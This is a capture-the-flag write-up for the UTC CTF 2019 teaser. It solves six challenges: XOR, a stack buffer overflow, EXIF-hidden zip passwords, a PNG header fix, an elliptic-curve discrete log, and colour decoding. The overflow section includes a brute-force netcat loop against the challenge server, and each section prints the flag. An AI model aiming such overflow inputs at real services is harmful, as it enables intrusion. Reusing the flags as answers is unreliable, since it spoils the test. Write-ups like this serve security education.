# utc_ctf_2019_teaser

## Xarriors Of The World

We are given a ciphertext.txt and following description
> Did you paid attention to the table of truth? `captain` will help you seek after you seek the truth.

Name of the chall suggests xor, and emphasis on `captain` suggests it may be the xor key.

```
$ cat ciphertext.txt
FhUTDwAQXTwCMAQVKV8NPgdHDQpeDgQvAFE2FlMTAh0OGx0e%

$ cat ciphertext.txt | python -c "from base64 import b64decode; x = b64decode(str(raw_input())); key = 'captain'; print(''.join([chr(ord(x[i]) ^ ord(key[i % len(key)])) for i in range(len(x))]))"
utc{ay3_c@pt@1n_w3lc0me_t0_x0rriors}
```

## Simple BOF

We are given some c code along with following description
> Want to learn the hacker's secret? Try to smash this buffer! You need guidance? Look no further than to  [Mr. Liveoverflow](https://old.liveoverflow.com/binary_hacking/protostar/stack0.html). He puts out nice videos you should look if you haven't already.
> nc chal.utc-ctf.club 35235

Let's have a look at the main part of the code

```
void vuln() {
  char padding[16];
  char buff[32];
  int notsecret = 0xffffff00;
  int secret = 0xdeadbeef;

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 

  // Check if secret has changed.
  if (secret == 0x67616c66) {
    puts("You did it! Congratuations!");
    print_flag(); // Print out the flag. You deserve it.
    return;
  } else if (notsecret != 0xffffff00) {
    puts("Uhmm... maybe you overflowed too much. Try deleting a few characters.");
  } else if (secret != 0xdeadbeef) {
    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
  } else {
    puts("Maybe you haven't overflowed enough characters? Try again?");
  }

  exit(0);
}
```

Really simple bof problem. `gets` is a vulnerable call as it can overwrite other variables in stack. So we need to overwrite variable `secret` so that it equals `0x67616c66` which translates to flag. So `buff = something + 'flag'` such that secret gets overwritten with `flag`.

I'm lazy af, so I'll just brute it.

```
$ for i in {1..500}; python -c "print('A' * $i + 'flag')" | nc chal.utc-ctf.club 35235; done | grep "utc"
utc{buffer_0verflows_4re_c00l!}
```

## EZIP

We are given two attachments - [cat.png](./files/cat.png) and [flag.zip](./files/flag.zip)

```
$ exiftool cat.png
ExifTool Version Number         : 10.10
File Name                       : cat.png
Directory                       : .
File Size                       : 285 kB
File Modification Date/Time     : 2019:12:21 13:06:41+05:30
File Access Date/Time           : 2019:12:24 02:22:57+05:30
File Inode Change Date/Time     : 2019:12:21 13:07:53+05:30
File Permissions                : rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 439
Image Height                    : 527
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Gamma                           : 2.2222
Software                        : Adobe ImageReady
Comment                         : e4syp4ssf0rz1p
Image Size                      : 439x527
Megapixels                      : 0.231
```

Notice the `comment` in exiftool output.

```
$ unzip -P "e4syp4ssf0rz1p" flag.zip                                                                                          ] 2:26 AM
Archive:  flag.zip
   creating: getme/
 extracting: getme/flag.txt

$ cat getme/flag.txt
utc{ex1f_ru135_4ll_7h3_w4y}
```

## Optics 1

We are given [challenge1.png](./files/challenge1.png) with following description

> I dropped out of my physics class due to boring optical theory. I joined Forensics class thereafter. But, I found Optics there too. Help me clear this class :facepalm:

```
$ file challenge1.png
challenge1.png: data

$ od -bc challenge1.png | head
0000000 211 114 117 114 015 012 032 012 000 000 000 015 111 110 104 122
        211   L   O   L  \r  \n 032  \n  \0  \0  \0  \r   I   H   D   R
0000020 000 000 001 054 000 000 001 054 010 006 000 000 000 171 175 216
         \0  \0 001   ,  \0  \0 001   ,  \b 006  \0  \0  \0   y   } 216
0000040 165 000 000 000 004 147 101 115 101 000 000 261 217 013 374 141
          u  \0  \0  \0 004   g   A   M   A  \0  \0 261 217  \v 374   a
0000060 005 000 000 000 001 163 122 107 102 000 256 316 034 351 000 000
        005  \0  \0  \0 001   s   R   G   B  \0 256 316 034 351  \0  \0
0000100 000 040 143 110 122 115 000 000 172 046 000 000 200 204 000 000
         \0       c   H   R   M  \0  \0   z   &  \0  \0 200 204  \0  \0
```

Seeing the headers of file, the issue is clearly visible. Replacing `LOL` with `PNG` and opening the image gives us a qr code which gives us the flag `utc{dang_you_know_qr_decoding_and_shit}`.

## Curve It Up

We are given a file `curve.txt`

```
$ cat curve.txt
Elliptic Curve: y^2 = x^3 + A*x + B mod N

N = 58738485967040967283590643918006240808790184776077323544750172596357004242953
A = 76727570604275129576071347306603709762219034167050511215297136720584179974657
B = ???

P = (1499223386326383661524589770996693829399568387777849887556841520506306635197, 18509752623395560148909577815970815579696746171847377654079329916213349431951)
Q = (29269524564002256949792104801311755011410313401000538744897527268133583311507, 29103379885505292913479681472487667587485926778997205945316050421132313574991)
Q = n*P

The flag is utfc{n}
```

Let's open up sagemath and do some analysis.

```
$ sagemath
sage: N = 58738485967040967283590643918006240808790184776077323544750172596357004242953
....: A = 76727570604275129576071347306603709762219034167050511215297136720584179974657
....: P = (1499223386326383661524589770996693829399568387777849887556841520506306635197, 1850975262339556014890957781597081557969674617184737765407932
....: 9916213349431951)
....: Q = (29269524564002256949792104801311755011410313401000538744897527268133583311507, 291033798855052929134796814724876675874859267789972059453160
....: 50421132313574991)
....:
sage: B = ((P[1]**2) - (P[0]**3) - (A * P[0])) % N
sage: E = EllipticCurve(FiniteField(N), [A, B])
sage: p, q = E(P), E(Q)
sage: p.order() / E.order()
1/3
sage: is_prime(N)
True
```

So, N is prime and order of P is sufficiently large for `pohlig-hellman` attack.

```
sage: discrete_log(q,p,p.order(),operation='+')
314159
```

Our flag is `utc{314159}`

## Really Good Picture

We are given an [image](./files/flag.png) with following description
>Instead of a flag, I made you a picture, is that ok?

Observing the picture we see different bands of colors (maybe each band representing a part of the flag?)

```
$ python
>>> import cv2
>>> x = cv2.cvtColor(cv2.imread('./flag.png'), cv2.COLOR_BGR2RGB)
>>> unique_colors = []
>>> for w in range(x.shape[1]):
        color = list(x[0][w])
        if color not in unique_colors:
            unique_colors.append(color)
>>> ''.join([''.join(map(chr, color)) for color in unique_colors])
'utc{taste_the_rainbow94100389}'
```
